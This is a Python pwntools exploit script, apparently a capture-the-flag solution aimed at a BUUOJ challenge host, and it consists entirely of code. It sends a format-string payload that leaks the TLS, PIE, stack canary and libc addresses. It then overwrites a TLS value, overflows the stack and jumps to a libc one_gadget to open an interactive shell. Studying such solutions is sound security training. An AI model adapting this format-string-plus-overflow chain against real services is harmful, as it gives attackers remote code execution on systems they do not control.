from pwn import*
p = remote('node3.buuoj.cn',29267)
libc = ELF('./libc-2.27.so',checksec=False)
p.sendlineafter('choice: ','F')
context.log_level ='DEBUG'
p.sendline('%p%p%pTLS:%pO%pPIE:%pJ%pCanary:%pK%pLIBC:%pL')
p.recvuntil('TLS:')
mod_tls = int(p.recvuntil('O',drop=True),16) + 0x28
p.recvuntil('PIE:')
pie = int(p.recvuntil('J',drop=True),16) - 0xDD8
p.recvuntil('Canary:')
canary = int(p.recvuntil('K',drop=True),16)
p.recvuntil('LIBC:')
libc_base = int(p.recvuntil('L',drop=True),16) - 231 - libc.sym['__libc_start_main']
log.info('PIE:\t' + hex(pie))
log.info('Canary:\t' + hex(canary))
log.info('LIBC:\t' + hex(libc_base))
rce = libc_base + 0x4F322
p.sendlineafter('choice: ','A')
p.sendline(str(mod_tls))
p.sendlineafter('choice: ','S')
p.sendline('U'*0x28 + p64(0x45524F5453475542) + 'U'*8 + p64(rce))
p.interactive()

